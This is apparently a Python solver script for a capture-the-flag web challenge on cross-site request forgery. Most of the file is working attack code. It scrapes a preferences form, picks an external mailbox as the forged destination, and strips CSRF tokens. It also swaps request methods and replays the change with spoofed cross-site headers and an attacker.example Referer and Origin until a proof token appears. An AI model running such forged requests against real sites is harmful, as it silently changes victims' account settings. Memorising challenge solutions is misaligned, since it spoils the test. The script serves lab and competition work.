#!/usr/bin/env python3
"""Day-22 web "Forged With Care" (CSRF) -- direct probe first, then the generic lib.web race as the fallback.

    solve.py --contract <contract.json> --artifacts <dir>   ->  {answer_id: proof} JSON on the last line

Construct (single + TT): /api/clues names `feature_route` (/submit-<hex6>) and `preferences_route` (/preferences). The
preferences page carries a `<form method=get action=/submit-..>` with a `<select name=destination>` (current value +
an external mailbox) and a hidden `csrf_token` equal to the arena_session cookie. Submitting the change same-site
records `changed_across_sites:false`; the SAME request sent as a cross-site navigation (Sec-Fetch-Site: cross-site,
foreign Referer) makes /api/preferences return `evidence: proof_<hex>`. ~5 requests -- the generic lib.web race (every
earlier solver x the default ladder) took 41 s and found nothing, so it now runs ONLY when this probe misses (a
compounded Mastery target of an earlier class), and not at all when the target is gone (4xx/5xx on every recon URL)."""
import json
import re
import sys
import threading
import urllib.parse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[4]
sys.path.insert(0, str(ROOT))
from lib import solverrt, websolve  # noqa: E402

XSITE = {"Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Dest": "document",
         "Sec-Fetch-User": "?1", "Referer": "https://attacker.example/forged.html"}
ATTR = r"""\b{}\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))"""


def _attr(tag, name):
    m = re.search(ATTR.format(name), tag, re.I)
    return next((g for g in m.groups() if g is not None), "") if m else None


class _Session:
    """Tiny cookie jar over websolve.fetch (keeps the victim's arena_session across the recon and the forged hit)."""

    def __init__(self, base):
        self.base, self.jar = base, {}

    def get(self, path, headers=None, data=None, method=None):
        h = dict(headers or {})
        if self.jar:
            h["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.jar.items())
        st, body, sc = websolve.fetch(urllib.parse.urljoin(self.base, path), h, data=data, method=method)
        for c in sc:
            k, _, v = c.split(";", 1)[0].partition("=")
            if k.strip():
                self.jar.setdefault(k.strip(), v.strip())
        return st, body


def _forms(html):
    """[(method, action, fields{name: value}, choices{name: [option values]})] for every <form> in the page."""
    out = []
    for m in re.finditer(r"<form\b([^>]*)>(.*?)</form>", html, re.I | re.S):
        tag, inner = m.groups()
        fields, choices = {}, {}
        for s in re.finditer(r"<select\b([^>]*)>(.*?)</select>", inner, re.I | re.S):
            name = _attr(s.group(1), "name")
            if name:
                opts = [_attr(o, "value") for o in re.findall(r"<option\b[^>]*>", s.group(2), re.I)]
                choices[name] = [o for o in opts if o is not None]
        for i in re.findall(r"<(?:input|textarea|button)\b[^>]*>", inner, re.I):
            name = _attr(i, "name")
            if name and (_attr(i, "type") or "").lower() not in ("submit", "button", "reset"):
                fields[name] = _attr(i, "value") or ""
        out.append(((_attr(tag, "method") or "get").lower(), _attr(tag, "action") or "", fields, choices))
    return out


def _state_routes(html, clues):
    """Where the app shows the saved state: /api/* links on the form page, then /api/* values in the clues."""
    links = re.findall(r"""href\s*=\s*["'](/api/[^"'#]+)["']""", html, re.I)
    links += [v for v in clues.values() if isinstance(v, str) and v.startswith("/api/") and v != "/api/clues"]
    return list(dict.fromkeys(links))


def csrf(base, clues=None):
    """Proof for one CSRF target (see module doc), or None when the target shows no forgeable state-changing form."""
    s = _Session(base)
    if clues is None:
        res = {}
        t = threading.Thread(target=lambda: res.update(c=websolve.fetch(urllib.parse.urljoin(base, "/api/clues"))))
        t.start()
        s.get("/")                                     # plants the victim session cookie
        t.join()
        try:
            clues = json.loads(res["c"][1])
        except (ValueError, TypeError, KeyError):
            clues = {}
    clues = clues if isinstance(clues, dict) else {}
    action_route = clues.get("feature_route")
    pages = [v for k, v in clues.items() if isinstance(v, str) and re.fullmatch(r"/[\w./-]*", v)
             and v != action_route and not v.startswith("/api/")]
    for page in pages + ([action_route] if action_route else []):
        st, html = s.get(page)
        p = websolve.proof(html)
        if p:
            return p
        for method, action, fields, choices in _forms(html):
            if not choices and not fields:
                continue
            action = action or page
            cur = re.search(r"(?:current|saved)[^<]*:\s*(?:<[^>]+>\s*)*([^<\s][^<]*)", html, re.I)
            cur = cur.group(1).strip() if cur else None
            # the change the victim never asked for: a non-current option, the external/foreign one first
            alts = {}
            for name, opts in choices.items():
                cand = sorted(opts, key=lambda o: (o == cur, not re.search(r"@|extern|outside|attacker|admin|review",
                                                                           o, re.I)))
                alts[name] = cand
            n = max((len(v) for v in alts.values()), default=1)
            hidden = [k for k in fields if re.search(r"csrf|token|nonce|xsrf", k, re.I)]
            for i in range(n):
                base_form = dict(fields)
                for name, cand in alts.items():
                    base_form[name] = cand[min(i, len(cand) - 1)]
                no_tok = {k: v for k, v in base_form.items() if k not in hidden}
                for form, meth in ((base_form, method), (no_tok, method),
                                   (base_form, "post" if method == "get" else "get")):
                    if meth == "post":
                        hdr = dict(XSITE, Origin="https://attacker.example")
                        st, body = s.get(action, hdr, data=form, method="POST")
                    else:
                        q = urllib.parse.urlencode(form)
                        st, body = s.get(f"{action}{'&' if '?' in action else '?'}{q}", XSITE)
                    p = websolve.proof(body)
                    if p:
                        return p
                    if not 200 <= st < 300:
                        continue
                    for r in _state_routes(html, clues):
                        p = websolve.proof(s.get(r)[1])
                        if p:
                            return p
    return None


def answer(answer_id, question, data, contract):
    """Self-contained CSRF probe (lib.web races every web solver's answer(): this must NOT call back into it)."""
    base = websolve.base_of(question, contract)
    return csrf(base) if base else None


def _solve_one(job):
    aid, q, contract = job
    base = websolve.base_of(q, contract)
    if not base:
        return {}
    p = csrf(base)
    if p:
        return {aid: p}
    if not 200 <= websolve.fetch(base)[0] < 400:      # expired target (410 {"state":"completed"}) / unreachable
        return {}
    from lib import web                               # compounded earlier-day class: the generic race
    p = web.solve_target(q, contract)
    return {aid: p} if p else {}


def main():
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--contract", required=True)
    ap.add_argument("--artifacts", required=False)
    a = ap.parse_args()
    contract = json.loads(Path(a.contract).read_text())
    ids = contract.get("answer_ids") or [q.get("id") for q in contract.get("questions", [])]
    qs = contract.get("questions", [])
    jobs = [(aid, qs[i] if i < len(qs) else {}, contract) for i, aid in enumerate(ids)]
    out, pool = {}, []
    solverrt.arm_deadline(out, pool)
    solverrt.run_sets(jobs, _solve_one, out, pool, io_bound=True)
    solverrt.emit_and_exit(out, pool)


if __name__ == "__main__":
    main()
